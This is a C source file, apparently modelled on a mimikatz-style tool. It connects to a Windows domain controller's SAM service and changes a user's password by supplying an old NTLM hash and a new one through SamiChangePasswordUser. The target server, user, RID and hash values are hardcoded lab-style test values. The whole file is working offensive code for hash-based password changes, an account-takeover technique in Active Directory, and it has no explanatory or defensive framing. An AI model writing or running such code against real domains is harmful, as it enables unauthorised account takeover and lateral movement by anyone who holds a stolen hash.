#include <stdio.h>
#include "l_lib.h"

#pragma comment(lib, "samlib.lib")
#pragma comment(lib, "ntdll.lib")

BOOL StringToHex(IN LPCWCHAR string, IN LPBYTE hex, IN DWORD size)
{
	DWORD i, j;
	BOOL result = (wcslen(string) == (size * 2));
	if (result)
	{
		for (i = 0; i < size; i++)
		{
			swscanf_s(&string[i * 2], L"%02x", &j);
			hex[i] = (BYTE)j;
		}
	}
	return result;
}

DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
NTSTATUS ChangeNTLM(PLSA_UNICODE_STRING uServerName, PLSA_UNICODE_STRING uUserName, DWORD rid, PVOID pvArg)
{
	DWORD dwUserAccess = USER_CHANGE_PASSWORD;
	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
	DWORD i, domainEnumerationContext = 0, domainCountRetourned, * pRid, * pUse;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
	PSID domainSid;
	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
	PK_CHANGENTLM_DATA data = (PK_CHANGENTLM_DATA)pvArg;

	SamConnect(uServerName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);

	do
	{
		enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);	
		for (i = 0; i < domainCountRetourned; i++)
		{
			if (RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
				continue;

			SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
			SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);

			if (uUserName)
			{
				pRid = NULL;
				pUse = NULL;
				SamLookupNamesInDomain(hDomainHandle, 1, uUserName, &pRid, &pUse);
				
				rid = pRid[0];
				if (pRid)
					SamFreeMemory(pRid);
				if (pUse)
					SamFreeMemory(pUse);	
			}

			if (rid)
			{
				SamOpenUser(hDomainHandle, dwUserAccess, rid, &hUserHandle);

				NTSTATUS status = SamiChangePasswordUser(hUserHandle, data->isOldLM, data->oldLM, data->newLM, data->isNewNTLM, data->oldNTLM, data->newNTLM);

				if (NT_SUCCESS(status))
					wprintf(L"[*] Change password success!\n");
				else if (status == STATUS_WRONG_PASSWORD)
					wprintf(L"[x] Failed!\n");
				else if (status == STATUS_PASSWORD_RESTRICTION)
					wprintf(L"[x] Failed! (restriction)\n");
				else wprintf(L"[x] SamiChangePasswordUser: %08x\n", status);

				SamCloseHandle(hUserHandle);
			}

			SamCloseHandle(hDomainHandle);
				
			SamFreeMemory(domainSid);
		}
		SamFreeMemory(pEnumDomainBuffer);
	} while (enumDomainStatus == STATUS_MORE_ENTRIES);
	SamCloseHandle(hServerHandle);
	

	return status;
}

int main()
{
	LSA_UNICODE_STRING serverName;
	LSA_UNICODE_STRING userName;
	K_CHANGENTLM_DATA infos = { FALSE, {0}, {0}, TRUE, {0}, {0} };

	PCWCHAR szServer = L"TESTDC1.TESTAD.LOCAL";
	PCWCHAR szUser = L"test2";
	DWORD rid = 2106;
	RtlInitUnicodeString(&userName, szUser);
	RtlInitUnicodeString(&serverName, szServer);

	PCWCHAR oldNTLM = L"41683c8a2fe586904aa8775e225da91e";
	PCWCHAR newNTLM = L"3e7ca8f1a60ed117c282c751c8c0ab4d";
	StringToHex(oldNTLM, infos.oldNTLM, sizeof(infos.oldNTLM));
	StringToHex(newNTLM, infos.newNTLM, sizeof(infos.newNTLM));

	ChangeNTLM(&serverName, &userName, rid, &infos);

	return 0;
}
